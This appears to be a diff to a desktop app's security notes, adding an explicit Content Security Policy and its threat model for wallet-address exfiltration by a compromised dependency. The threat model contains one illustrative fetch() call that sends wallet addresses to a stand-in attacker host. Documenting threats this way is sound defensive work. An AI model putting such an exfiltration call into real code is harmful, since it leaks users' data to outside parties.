@@ -55,14 +55,43 @@ in-scope issues:
   backend via the shared HTTP client and returned to the frontend
   as data URLs / parsed structs. The webview itself never makes
   direct outbound requests.
-- **Content Security Policy.** Set to `null` in `tauri.conf.json` —
-  deliberate while we baseline the design (Tailwind 4 injects styles
-  inline at build, the favicon path serves `data:image/png;base64,…`
-  URLs into `<img>` tags, the IPC bridge needs `ipc://` and
-  `tauri://` schemes). A restrictive explicit CSP is on the README
-  roadmap; the current `null` setting is acceptable for a v0.0.1
-  desktop app with no remote-content surface, but tightening it
-  before any plugin sandbox / extension hosting work is prudent.
+- **Content Security Policy.** Explicit, set in `tauri.conf.json`
+  since v0.0.2:
+
+  ```
+  default-src 'self';
+  script-src 'self';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data:;
+  font-src 'self';
+  connect-src 'self' ipc: https://ipc.localhost;
+  object-src 'none';
+  base-uri 'self';
+  frame-ancestors 'none'
+  ```
+
+  Threat model addressed: a compromised npm or Cargo dependency
+  shipped inside the legitimate signed binary. Without CSP, such
+  a dep could `fetch('https://evil.example/exfil', { body:
+  walletAddresses })` from the webview and the Sui addresses
+  Bifrost reads would be exfiltrated despite every other defence
+  (CI, signing, branch protection) holding. The `connect-src`
+  whitelist makes that `fetch()` fail at the browser layer with
+  no code review required.
+
+  `'unsafe-inline'` in `style-src` is the only deliberate
+  weakening — Svelte 5's reactive `style=` attributes can't be
+  nonce'd at build time without forking the compiler. Inline
+  `<script>` is still blocked (no `'unsafe-inline'` in
+  `script-src`).
+
+  Network reachability summary: Bifrost's WebView can only
+  initiate connections to `ipc:` / `https://ipc.localhost` (the
+  Tauri IPC bridge). All actual outbound HTTP (GitHub releases,
+  Sui mainnet RPC, favicon fetches) goes through the Rust
+  backend's single `reqwest::Client` — see
+  `src-tauri/src/http.rs`. The webview itself cannot reach the
+  internet.
 - **Per-rider browser.** Brave runs *inside* a Sandboxie box AND under
   its own per-rider `--user-data-dir`. Cross-rider session leakage
   would require either a Sandboxie escape or Bifrost writing the wrong
